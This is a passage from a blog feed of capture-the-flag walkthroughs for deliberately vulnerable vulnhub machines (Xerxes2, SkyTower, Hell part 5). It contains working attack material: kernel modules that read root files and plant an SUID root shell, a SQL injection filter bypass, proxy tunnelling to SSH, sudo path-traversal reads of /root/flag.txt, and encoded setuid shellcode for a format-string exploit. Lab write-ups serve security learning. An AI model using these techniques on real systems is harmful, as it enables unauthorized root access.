    // Obviously it is much smaller than the 128 bytes, but hell with it =)
    f = filp_open(&ldquo;/root/flag.txt&rdquo;, O_RDONLY, 0);
    if(f == NULL)
        printk(KERN_ALERT &ldquo;filp_open error!!.\n&rdquo;);
    else{
        // Get current segment descriptor
        fs = get_fs();
        // Set segment descriptor associated to kernel space
        set_fs(get_ds());
        // Read the file
        f->f_op->read(f, buf, 1024, &amp;f->f_pos);
        // Restore segment descriptor
        set_fs(fs);
        // See what we read from file
        printk(KERN_INFO &ldquo;buf:%s\n&rdquo;,buf);
    }
    filp_close(f,NULL);
    return 0;
}</p>

<p>void cleanup_module(void)
{
    printk(KERN_INFO &ldquo;My module is unloaded\n&rdquo;);
}
[/c]</p>

<p>I realised I needed a Makefile as well, so I knocked one of those up quickly (nothing complicated)</p>

<p>[plain]
obj-m += flag.o</p>

<p>all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules</p>

<p>clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
[/plain]</p>

<p>With the source code and the Makefile, I then compiled the kernel module and loaded it</p>

<p>[plain gutter=&ldquo;false&rdquo;]
korenchkin@xerxes2:~/kernel/kernel2/kernel3/kernel4$ make -C /lib/modules/$(uname -r)/build M=/home/korenchkin/kernel/kernel2/kernel3/kernel4 modules
make: Entering directory <code>/usr/src/linux-headers-3.2.0-4-686-pae'
  CC [M]  /home/korenchkin/kernel/kernel2/kernel3/kernel4/flag2.o
/home/korenchkin/kernel/kernel2/kernel3/kernel4/flag2.c: In function ‘init_module’:
/home/korenchkin/kernel/kernel2/kernel3/kernel4/flag2.c:37:1: warning: the frame size of 1028 bytes is larger than 1024 bytes [-Wframe-larger-than=]
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /home/korenchkin/kernel/kernel2/kernel3/kernel4/flag2.mod.o
  LD [M]  /home/korenchkin/kernel/kernel2/kernel3/kernel4/flag2.ko
make: Leaving directory</code>/usr/src/linux-headers-3.2.0-4-686-pae&#8217;
You have new mail in /var/mail/korenchkin
korenchkin@xerxes2:~/kernel/kernel2/kernel3/kernel4$ sudo insmod flag2.ko
korenchkin@xerxes2:~/kernel/kernel2/kernel3/kernel4$ dmesg | tail -20
[113593.419616] <code>MM(   )P' 6MMMMb</code>MM 6MM <code>MM(   )P' 6MMMMb   6MMMMb\  6MMMMb  
[113593.419617] </code>MM<code>,P  6M' </code>Mb MM69 &ldquo;  <code>MM</code> ,P  6M&#8217;  <code>Mb MM'   </code> MM&#8217;  <code>Mb
[113593.419618]  </code>MM,P   MM    MM MM&#8217;      <code>MM,P   MM    MM YM.           ,MM
[113593.419619]   </code>MM.   MMMMMMMM MM        <code>MM.   MMMMMMMM  YMMMMb      ,MM'
[113593.419619]    d</code>MM.  MM       MM        d<code>MM.  MM           </code>Mb   ,M&#8217;  <br/>
[113593.419620]   d&#8217; <code>MM. YM    d9 MM       d'</code>MM. YM    d9 L    ,MM ,M&#8217;    <br/>
[113593.419621] <em>d</em>  <em>)MM</em> YMMMM9 <em>MM</em>    <em>d</em>  <em>)MM</em> YMMMM9  MYMMMM9  MMMMMMMM
[113593.419622]
[113593.419622]     congratulations on beating xerxes2!
[113593.419623]
[113593.419623]     I hope you enjoyed it as much as I did making xerxes2.
[113593.419624]     xerxes1 has been described as &lsquo;weird&rsquo; and &lsquo;left-field&rsquo;
[113593.419625]     and I hope that this one fits that description too :)
[113593.419625]
[113593.419626]     Many thanks to @TheColonial &amp; @rasta_mouse for testing!
[113593.419626]
[113593.419627]     Ping me on #vulnhub for thoughts and comments!
[113593.419627]
[113593.419628]                       @barrebas, July 2014
[113593.419628]
[/plain]</p>

<p>So, most people would go &ldquo;I GOT THE FLAG !&rdquo; and do a little dance. Probably along these lines</p>

<p><img src="http://24.media.tumblr.com/d84096090e0740e9a0f9c91e94277f5a/tumblr_n411lwkMIO1qi4zmno1_500.gif" alt="" /></p>

<p>But I wanted more - I actually wanted a root shell. I wonder if I can run shell scripts with a kernel module. Hmm&hellip; google ? I was drawn to <a href="http://people.ee.ethz.ch/~arkeller/linux/kernel_user_space_howto.html">this article</a> which provided the following code</p>

<p>[c]</p>

<h1>include &lt;linux/module.h></h1>

<h1>include &lt;linux/kernel.h></h1>

<h1>include &lt;linux/init.h></h1>

<h1>include &lt;linux/proc_fs.h></h1>

<h1>include &lt;asm/uaccess.h></h1>

<p>static int __init usermodehelper_example_init(void)
{
    int ret = 0;
    char <em>argv[] = {&ldquo;/home/arkeller/eth/paper/code/callee&rdquo;, &ldquo;2&rdquo;, NULL };
    char </em>envp[] = {&ldquo;HOME=/&rdquo;, &ldquo;PATH=/sbin:/usr/sbin:/bin:/usr/bin&rdquo;, NULL };</p>

<pre><code>printk("usermodehelper: init\n");
/* last parameter: 1 -&gt; wait until execution has finished, 0 go ahead without waiting*/
/* returns 0 if usermode process was started successfully, errorvalue otherwise*/
/* no possiblity to get return value of usermode process*/
ret = call_usermodehelper("/home/arkeller/eth/paper/code/callee", argv, envp, UMH_WAIT_EXEC);
if (ret != 0)
    printk("error in call to usermodehelper: %i\n", ret);
else
    printk("everything all right\n");
    return 0;
</code></pre>

<p>}</p>

<p>static void __exit usermodehelper_example_exit(void)
{
    printk(&ldquo;usermodehelper: exit\n&rdquo;);
}</p>

<p>module_init(usermodehelper_example_init);
module_exit(usermodehelper_example_exit);
MODULE_LICENSE(&ldquo;GPL&rdquo;);
[/c]</p>

<p>I&rsquo;m on the home straight here - lets modify this code to run a shell script instead (the shell script used is identical to that used earlier to get from delacroix to polito).</p>

<p>[c]</p>

<h1>include &lt;linux/module.h></h1>

<h1>include &lt;linux/kernel.h></h1>

<h1>include &lt;linux/init.h></h1>

<h1>include &lt;linux/proc_fs.h></h1>

<h1>include &lt;asm/uaccess.h></h1>

<p>static int __init usermodehelper_example_init(void)
{
        int ret = 0;
        char <em>argv[] = {&ldquo;/home/korenchkin/runme.sh&rdquo;, &ldquo;2&rdquo;, NULL };
        char </em>envp[] = {&ldquo;HOME=/&rdquo;, &ldquo;PATH=/sbin:/usr/sbin:/bin:/usr/bin&rdquo;, NULL };</p>

<pre><code>    printk("usermodehelper: init\n");
    /* last parameter: 1 -&gt; wait until execution has finished, 0 go ahead without waiting*/
    /* returns 0 if usermode process was started successfully, errorvalue otherwise*/
    /* no possiblity to get return value of usermode process*/
    ret = call_usermodehelper("/home/korenchkin/runme.sh", argv, envp, UMH_WAIT_EXEC);
    if (ret != 0)
            printk("error in call to usermodehelper: %i\n", ret);
    else
            printk("everything all right\n");
    return 0;
</code></pre>

<p>}</p>

<p>static void __exit usermodehelper_example_exit(void)
{
        printk(&ldquo;usermodehelper: exit\n&rdquo;);
}</p>

<p>module_init(usermodehelper_example_init);
module_exit(usermodehelper_example_exit);
MODULE_LICENSE(&ldquo;GPL&rdquo;);[/c]</p>

<p>I created another Makefile, compiled the module and loaded it</p>

<p>[plain gutter=&ldquo;false&rdquo;]
korenchkin@xerxes2:~$ make -C /lib/modules/$(uname -r)/build M=/home/korenchkin/a modules
make: Entering directory <code>/usr/src/linux-headers-3.2.0-4-686-pae'
  CC [M]  /home/korenchkin/a/a.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /home/korenchkin/a/a.mod.o
  LD [M]  /home/korenchkin/a/a.ko
make: Leaving directory</code>/usr/src/linux-headers-3.2.0-4-686-pae&#8217;
korenchkin@xerxes2:~$ sudo insmod a.ko
korenchkin@xerxes2:~$[/plain]</p>

<p><img src="http://media.giphy.com/media/DUuyU3KyYGLNS/giphy.gif" alt="" /></p>

<p>[plain gutter=&ldquo;false&rdquo;]
korenchkin@xerxes2:~$ ls -l /tmp
total 244
-rwxr-xr-x 1 delacroix delacroix    55 Aug  6 16:15 123.sh
-rwsrwxrwx 1 root      root      97284 Aug  8 03:40 rootshell
-rwsrwxrwx 1 polito    polito    97284 Aug  6 16:15 shell
korenchkin@xerxes2:~/a$ /tmp/rootshell</p>

<h1>id</h1>

<p>uid=1000(korenchkin) gid=1000(korenchkin) euid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(korenchkin)
#
[/plain]</p>

<p>Well, what do you know - a binary owned by root with the SUID attribute set that drops us to a root shell. I&rsquo;ll echo my SSH key into authorized_keys for completeness, and SSH in as root and cat the /root/flag.txt file</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# ssh <a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x72;&#x6f;&#111;&#x74;&#64;&#x31;&#57;&#x32;&#x2e;&#49;&#54;&#x38;&#x2e;&#x30;&#46;&#x31;&#x30;&#x32;">&#x72;&#111;&#111;&#x74;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#46;&#48;&#x2e;&#x31;&#48;&#x32;</a></p>

<p>Welcome to xerxes2.
      XERXES wishes you
       a pleasant stay.</p>

<hr />

<p><code>MM(   )P' 6MMMMb</code>MM 6MM <code>MM(   )P' 6MMMMb   6MMMMb\  6MMMMb  
</code>MM<code>,P  6M' </code>Mb MM69 &ldquo;  <code>MM</code> ,P  6M&#8217;  <code>Mb MM'   </code> MM&#8217;  <code>Mb
 </code>MM,P   MM    MM MM&#8217;      <code>MM,P   MM    MM YM.           ,MM
  </code>MM.   MMMMMMMM MM        <code>MM.   MMMMMMMM  YMMMMb      ,MM'
   d</code>MM.  MM       MM        d<code>MM.  MM           </code>Mb   ,M&#8217;  <br/>
  d&#8217; <code>MM. YM    d9 MM       d'</code>MM. YM    d9 L    ,MM ,M&#8217;    <br/>
<em>d</em>  <em>)MM</em> YMMMM9 <em>MM</em>    <em>d</em>  <em>)MM</em> YMMMM9  MYMMMM9  MMMMMMMM</p>

<p>root@xerxes2:~# id
uid=0(root) gid=0(root) groups=0(root)
root@xerxes2:~# cat flag.txt</p>

<hr />

<p><code>MM(   )P' 6MMMMb</code>MM 6MM <code>MM(   )P' 6MMMMb   6MMMMb\  6MMMMb  
</code>MM<code>,P  6M' </code>Mb MM69 &ldquo;  <code>MM</code> ,P  6M&#8217;  <code>Mb MM'   </code> MM&#8217;  <code>Mb
 </code>MM,P   MM    MM MM&#8217;      <code>MM,P   MM    MM YM.           ,MM
  </code>MM.   MMMMMMMM MM        <code>MM.   MMMMMMMM  YMMMMb      ,MM'
   d</code>MM.  MM       MM        d<code>MM.  MM           </code>Mb   ,M&#8217;  <br/>
  d&#8217; <code>MM. YM    d9 MM       d'</code>MM. YM    d9 L    ,MM ,M&#8217;    <br/>
<em>d</em>  <em>)MM</em> YMMMM9 <em>MM</em>    <em>d</em>  <em>)MM</em> YMMMM9  MYMMMM9  MMMMMMMM</p>

<pre><code>congratulations on beating xerxes2!

I hope you enjoyed it as much as I did making xerxes2. 
xerxes1 has been described as 'weird' and 'left-field'
and I hope that this one fits that description too :)

Many thanks to @TheColonial &amp; @rasta_mouse for testing!

Ping me on #vulnhub for thoughts and comments!

                  @barrebas, July 2014
</code></pre>

<p>root@xerxes2:~#
[/plain]</p>

<p><img src="http://www.awesomelyluvvie.com/wp-content/uploads/2013/01/CharlieBrownDance2.gif" alt="" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[I Climbed the SkyTower, But No Rapunzel :(]]></title>
    <link href="http://recrudesce.github.io/blog/2014/08/05/i-climbed-the-skytower-but-no-rapunzel/"/>
    <updated>2014-08-05T23:49:01+01:00</updated>
    <id>http://recrudesce.github.io/blog/2014/08/05/i-climbed-the-skytower-but-no-rapunzel</id>
    <content type="html"><![CDATA[<p>SkyTower is available from <a href="http://vulnhub.com/entry/skytower-1,96/">Vulnhub</a>, and is a quick brain teaser that everyone is encouraged to try. It doesn&rsquo;t take long, so it&rsquo;s fun to see if you can do in your lunchbreak. The walkthrough is going to be short and sweet - maybe with a few GIFs thrown in for good measure.</p>

<!-- more -->


<h2>So What Runneth Upon Thee ?</h2>

<p>Obviously NMAP is used to get a quick rundown of what services are available.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# nmap -sS -T4 -O -A -p1-65535 192.168.0.106</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-08-05 22:59 BST
Nmap scan report for 192.168.0.106
Host is up (0.00s latency).
Not shown: 65532 closed ports
PORT     STATE    SERVICE    VERSION
22/tcp   filtered ssh
80/tcp   open     http       Apache httpd 2.2.22 ((Debian))
|<em>http-title: Site doesn&rsquo;t have a title (text/html).
3128/tcp open     http-proxy Squid http proxy 3.1.20
|</em>http-methods: No Allow or Public header in OPTIONS response (status code 400)
| http-open-proxy: Potentially OPEN proxy.
|<em>Methods supported:  GET
|</em>http-title: ERROR: The requested URL could not be retrieved
MAC Address: 08:00:27:54:4A:37 (Cadmus Computer Systems)
No exact OS matches for host (If you know what OS is running on it, see <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> ).
TCP/IP fingerprint:
OS:SCAN(V=6.46%E=4%D=8/5%OT=80%CT=1%CU=42026%PV=Y%DS=1%DC=D%G=Y%M=080027%TM
OS:=53E153CE%P=i686-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS
OS:=8)OPS(O1=M5B4ST11NW3%O2=M5B4ST11NW3%O3=M5B4NNT11NW3%O4=M5B4ST11NW3%O5=M
OS:5B4ST11NW3%O6=M5B4ST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=38
OS:90)ECN(R=Y%DF=Y%T=40%W=3908%O=M5B4NNSNW3%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q
OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A
OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y
OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
OS:=40%CD=S)</p>

<p>Network Distance: 1 hop</p>

<p>TRACEROUTE
HOP RTT     ADDRESS
1   0.00 ms 192.168.0.106</p>

<p>OS and Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
Nmap done: 1 IP address (1 host up) scanned in 33.35 seconds
root@pwk:~# [/plain]</p>

<p>Not very exciting - SSH, HTTP and a SQUID proxy. Interestingly SSH is filtered, which means no easy route in :(</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/53193742.jpg"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/53193742.jpg" alt="53193742" /></a></p>

<p>HTTP is our next destination, which shows a nicely branded login page.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_001.png" alt="skytower_001" /></a></p>

<p>SQLi me-thinks.  Lets try some simple things like entering 123&#8217; or 1=1 into the email field and clicking Login</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_002.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_002.png" alt="skytower_002" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_003.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_003.png" alt="skytower_003" /></a></p>

<p>Hmm, no dice. Looks like the code is filtering out simple SQLi.  Can we fool this into filtering out the &lsquo;or&rsquo; and the &lsquo;=&rsquo; but still have an &lsquo;or&rsquo; clause left over ?  Turns out, yes we can ;)</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_004.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_004.png" alt="skytower_004" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_005.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_005.png" alt="skytower_005" /></a></p>

<p>This requires a GIF&hellip;</p>

<p><img src="http://31.media.tumblr.com/tumblr_lvgefaA0WX1qhigt0o1_500.gif" alt="" /></p>

<hr />

<h2>Looting the Retirement Fund</h2>

<p>We now have SSH login credentials, but you&rsquo;ll remember earlier on that SSH is filtered externally. It is, however, possible to leverage the SQUID proxy to get an SSH session using proxytunnel to bind a local port.</p>

<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# proxytunnel -p 192.168.0.106:3128 -d 127.0.0.1:22 -a 222[/plain]</p>

<p>A quick netstat shows that our local port is available</p>

<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# netstat -antp tcp | grep :222
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:222             0.0.0.0:*               LISTEN      5135/proxytunnel: [/plain]</p>

<p>Let us SSH into it with the provided credentials</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# ssh <a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#x3a;&#x6a;&#111;&#104;&#x6e;&#64;&#49;&#50;&#x37;&#x2e;&#48;&#46;&#x30;&#46;&#49;">&#x6a;&#111;&#x68;&#110;&#64;&#49;&#50;&#55;&#46;&#x30;&#46;&#x30;&#46;&#x31;</a> -p 222
The authenticity of host &lsquo;[127.0.0.1]:222 ([127.0.0.1]:222)&rsquo; can&rsquo;t be established.
ECDSA key fingerprint is f6:3b:95:46:6e:a7:0f:72:1a:67:9e:9b:8a:48:5e:3d.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &lsquo;[127.0.0.1]:222&rsquo; (ECDSA) to the list of known hosts.
<a href="&#109;&#97;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#x6a;&#x6f;&#x68;&#110;&#64;&#x31;&#50;&#x37;&#x2e;&#x30;&#46;&#x30;&#46;&#x31;">&#x6a;&#111;&#x68;&#x6e;&#64;&#x31;&#50;&#x37;&#x2e;&#x30;&#46;&#x30;&#46;&#x31;</a>&rsquo;s password:
Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64</p>

<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jun 20 07:41:08 2014</p>

<p>Funds have been withdrawn
Connection to 127.0.0.1 closed.
root@pwk:~#[/plain]</p>

<p>Seems like the admins have been clever, and have edited this users .bashrc file to terminate the session upon connection. It is possible to use the -t argument of the SSH client to execute an application when a connection is made, so how about running a shell ?</p>

<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# ssh <a href="&#109;&#x61;&#105;&#108;&#116;&#x6f;&#58;&#106;&#111;&#x68;&#x6e;&#x40;&#49;&#x32;&#55;&#46;&#48;&#x2e;&#48;&#46;&#x31;">&#106;&#x6f;&#x68;&#110;&#64;&#49;&#50;&#x37;&#46;&#x30;&#46;&#x30;&#46;&#49;</a> -p 222 -t &ldquo;/bin/sh&rdquo;
<a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#x6f;&#58;&#x6a;&#x6f;&#104;&#110;&#x40;&#49;&#x32;&#x37;&#46;&#48;&#46;&#x30;&#x2e;&#49;">&#x6a;&#111;&#104;&#x6e;&#64;&#x31;&#x32;&#55;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#x31;</a>&rsquo;s password: hereisjohn
john@SkyTower:~$[/plain]</p>

<p>First things first, that SQLi filter - what did it look like in it&rsquo;s entirety ?</p>

<p>[php]$sqlinjection = array(&ldquo;SELECT&rdquo;, &ldquo;TRUE&rdquo;, &ldquo;FALSE&rdquo;, &ldquo;&ndash;&rdquo;,&ldquo;OR&rdquo;, &ldquo;=&rdquo;, &ldquo;,&rdquo;, &ldquo;AND&rdquo;, &ldquo;NOT&rdquo;);
$email = str_ireplace($sqlinjection, &ldquo;&rdquo;, $<em>POST[&lsquo;email&rsquo;]);
$password = str_ireplace($sqlinjection, &ldquo;&rdquo;, $</em>POST[&lsquo;password&rsquo;]);[/php]</p>

<p>Quite simple, but annoying none the less. Thankfully it was easily bypassed.
It&rsquo;s obvious while looking at the /var/www/login.php file that the application uses a MySQL database to handle logins. The MySQL credentials are helpfully in plain text within the file</p>

<p>[php]$db = new mysqli(&lsquo;localhost&rsquo;, &lsquo;root&rsquo;, &lsquo;root&rsquo;, &lsquo;SkyTech&rsquo;);[/php]</p>

<p>Using the mysql client, it is possible to obtain all users passwords, as they are stored unencrypted in the login table within the SkyTech database</p>

<p>[plain gutter=&ldquo;false&rdquo;]
john@SkyTower:~$ mysql -uroot -proot
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 51
Server version: 5.5.35-0+wheezy1 (Debian)</p>

<p>Copyright &copy; 2000, 2013, Oracle and/or its affiliates. All rights reserved.</p>

<p>Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.</p>

<p>Type &lsquo;help;&rsquo; or &lsquo;\h&rsquo; for help. Type &lsquo;\c&rsquo; to clear the current input statement.</p>

<p>mysql> use SkyTech;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A</p>

<p>Database changed
mysql> show tables;
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
| Tables_in_SkyTech |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
| login             |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
1 row in set (0.00 sec)</p>

<p>mysql> select * from login;
+&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&ndash;+
| id | email               | password     |
+&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&ndash;+
|  1 | <a href="&#x6d;&#x61;&#x69;&#108;&#116;&#x6f;&#58;&#106;&#111;&#104;&#x6e;&#64;&#115;&#x6b;&#121;&#116;&#x65;&#x63;&#104;&#x2e;&#99;&#111;&#x6d;">&#x6a;&#111;&#104;&#110;&#64;&#x73;&#107;&#x79;&#116;&#x65;&#99;&#x68;&#x2e;&#99;&#x6f;&#x6d;</a>    | hereisjohn   |
|  2 | <a href="&#109;&#x61;&#x69;&#108;&#116;&#111;&#58;&#115;&#97;&#114;&#97;&#x40;&#115;&#107;&#121;&#116;&#x65;&#x63;&#104;&#x2e;&#99;&#111;&#109;">&#x73;&#x61;&#114;&#97;&#x40;&#115;&#x6b;&#121;&#116;&#x65;&#x63;&#x68;&#x2e;&#99;&#x6f;&#x6d;</a>    | ihatethisjob |
|  3 | <a href="&#109;&#x61;&#x69;&#x6c;&#116;&#x6f;&#58;&#119;&#105;&#x6c;&#108;&#x69;&#x61;&#x6d;&#x40;&#115;&#107;&#121;&#116;&#x65;&#99;&#104;&#46;&#x63;&#x6f;&#x6d;">&#119;&#105;&#x6c;&#x6c;&#x69;&#x61;&#x6d;&#64;&#x73;&#x6b;&#x79;&#x74;&#x65;&#99;&#104;&#x2e;&#x63;&#x6f;&#109;</a> | senseable    |
+&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&ndash;+
3 rows in set (0.00 sec)</p>

<p>mysql>[/plain]</p>

<p>That&rsquo;s handy - William looks like he&rsquo;s revered by the company, as his password is (a typo) of &lsquo;sensible&rsquo;. Unfortunately his credentials do not work</p>

<p>[plain gutter=&ldquo;false&rdquo;]
john@SkyTower:~$ su william
Password:
su: Authentication failure
john@SkyTower:~$[/plain]</p>

<p>How about Sara ?</p>

<p>[plain gutter=&ldquo;false&rdquo;]
john@SkyTower:~$ su sara
Password:</p>

<p>Funds have been withdrawn
john@SkyTower:~$
[/plain]</p>

<p>We&rsquo;re hitting on the same issue that we had with John - SSH -t to the rescue once again, but this time using a different shell (for some reason /bin/bash does not work)</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# ssh <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#111;&#x3a;&#115;&#97;&#114;&#x61;&#64;&#49;&#x32;&#x37;&#46;&#48;&#x2e;&#x30;&#46;&#49;">&#115;&#97;&#x72;&#x61;&#64;&#x31;&#50;&#x37;&#46;&#x30;&#46;&#48;&#46;&#x31;</a> -p 222 -t /bin/sh
<a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x73;&#97;&#114;&#97;&#64;&#x31;&#x32;&#x37;&#x2e;&#x30;&#x2e;&#x30;&#46;&#49;">&#x73;&#x61;&#114;&#x61;&#64;&#x31;&#x32;&#55;&#x2e;&#x30;&#x2e;&#48;&#46;&#x31;</a>&rsquo;s password: ihatethisjob
$[/plain]</p>

<p><img src="http://i.imgur.com/PbksBXu.gif" alt="" /></p>

<p>Sara has been entrusted with sudo ability, albeit very locked down, but the available commands running as the root user can be used to leverage directory traversal to read files elsewhere on the filesystem. Files such as /root/flag.txt, which provides us with the root password</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ sudo -l
Matching Defaults entries for sara on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>

<p>User sara may run the following commands on this host:
    (root) NOPASSWD: /bin/cat /accounts/<em>, (root) /bin/ls /accounts/</em>
$ sudo cat /accounts/../../root/flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower
$ [/plain]</p>

<p>A quick su root drops us to a root shell</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ su root
Password: theskytower
root@SkyTower:/home/sara# id
uid=0(root) gid=0(root) groups=0(root)
root@SkyTower:/home/sara# [/plain]</p>

<p><img src="http://38.media.tumblr.com/5e829faafb14759c51d20dae54525c29/tumblr_n964zghd0h1qz581wo2_500.gif" alt="" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hell Walkthrough – Part 5]]></title>
    <link href="http://recrudesce.github.io/blog/2014/07/21/hell-walkthrough-part-5/"/>
    <updated>2014-07-21T22:14:03+01:00</updated>
    <id>http://recrudesce.github.io/blog/2014/07/21/hell-walkthrough-part-5</id>
    <content type="html"><![CDATA[<p><a href="http://fourfourfourfour.co/2014/07/17/hell-walkthrough-part-1/">Part 1</a> | <a href="http://fourfourfourfour.co/2014/07/18/hell-walkthrough-part-2/">Part 2</a> | <a href="http://fourfourfourfour.co/2014/07/19/hell-walkthrough-part-3/">Part 3</a> | <a href="http://fourfourfourfour.co/2014/07/20/hell-walkthrough-part-4/">Part 4</a> | Part 5</p>

<p>This is the last step. The last hoop that needs to be jumped through. The last wall of hurdles between me and root. LET&rsquo;S DO THIS !</p>

<h2>Orange Juice Doesn&rsquo;t Echo</h2>

<p>The OJ user has 1 file, a binary called echo which does exactly that, it repeats what you send it. This guy is the height of programming ability. There&rsquo;s got to be something wrong with it.</p>

<!-- more -->


<p>A quick look at the binary in IDA, and yes there is something wrong with it, there seems to be something in it that is called a &ldquo;format string vulnerability&rdquo;.</p>

<p><img src="https://pmpaspeakingofprecision.files.wordpress.com/2014/07/confused-child.jpg" alt="" /></p>

<p>wut ?</p>

<p>What felt like 12 days of reading, and video watching (Fuzzy Security videos are the best - check <a href="https://www.youtube.com/watch?v=NwzmYSlETI8">this one out for formatstr vuln explanation</a> and the <a href="https://www.youtube.com/watch?v=CHrs30g-3O0">follow up</a>) I still felt none the wiser.  But I figured I&rsquo;d give it a go anyway.  What&rsquo;s the worst that can happen ?  I can&rsquo;t make it any more wrong now can I ?</p>

<p>Meh, let&rsquo;s put our shellcode (setuid plus /bin/sh) into memory anyway, just so it looks like we&rsquo;re progressing.</p>

<p>[plain gutter=&ldquo;false&rdquo;]export SHELLCODE=$(python -c &lsquo;print &ldquo;\x90&rdquo; * 1000 + &ldquo;\x89\xe7\xda\xc3\xd9\x77\xf4\x5f\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x75\x61\x4b\x6b\x51\x7a\x42\x37\x56\x38\x68\x4d\x6d\x50\x43\x5a\x64\x4b\x33\x68\x6a\x39\x36\x32\x35\x36\x51\x78\x44\x6d\x61\x73\x6e\x69\x79\x77\x33\x58\x34\x6f\x31\x63\x32\x48\x73\x30\x43\x58\x54\x6f\x53\x52\x51\x79\x62\x4e\x6f\x79\x7a\x43\x43\x62\x38\x68\x77\x78\x63\x30\x43\x30\x55\x50\x36\x4f\x50\x62\x51\x79\x52\x4e\x66\x4f\x42\x53\x30\x68\x55\x50\x46\x37\x53\x63\x6d\x59\x49\x71\x7a\x6d\x4f\x70\x41\x41&rdquo;&rsquo;)[/plain]</p>

<p>So, I started to play around with gdb and format strings.
There are several ways you can do format string vulnerabilities - you can put your shellcode in memory using an environment variable, then overwrite a global offset table entry to execute your code (as per the videos), or if you&rsquo;re unlucky like me and have a statically linked binary, you have to find another way such as jumping to a location in the stack. I tried that&hellip; it didn&rsquo;t work because my shellcode kept moving in memory.</p>

<p><img src="http://media.tumblr.com/201153f420ed4a2ca50fadbcfabacce3/tumblr_inline_n1mltcP4Bf1ss9nq4.gif" alt="" /></p>

